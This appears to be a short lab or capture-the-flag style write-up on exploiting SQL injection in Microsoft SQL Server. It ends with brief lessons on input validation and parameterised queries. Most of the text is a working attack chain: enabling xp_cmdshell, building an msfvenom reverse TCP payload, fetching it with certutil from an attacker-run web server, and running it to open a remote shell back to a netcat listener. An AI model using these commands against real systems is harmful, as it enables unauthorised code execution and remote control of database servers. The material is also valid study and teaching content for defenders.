## Test for sql injection
`age='` throws an error

## Calling stored procedures
Microsoft sql has `xp_cmdshell`

## Enable xp_cmdshell
`EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;`
`EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;`

## Reverse Shell
`certutil.exe` helps us by making https connections to download our payload
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe`
- Host file on server `python3 -m http.server`
- `Exec xp_cmdshell 'certutil -urlcache -f http://LOCAL_IP:8000/reverse.exe C:\Windows\Temp\reverse.exe'`
- Start netcat listen
- run file with `Exec xp_cmdshell 'C:\Windows\Temp\reverse.exe`

## Lessons learned
### Input validation: 
Sanitise and validate all user-supplied input to ensure it adheres to expected data types and formats. Reject any input that doesn't meet validation criteria.

### Parameterised statements: 
Use prepared statements and parameterised queries in your database interactions. Parameterised queries automatically escape user input, making it difficult for attackers to inject malicious SQL.

### Stored procedures: 
Use stored procedures to encapsulate your SQL logic whenever possible. This reduces the risk of SQL injection by separating user input from SQL code.
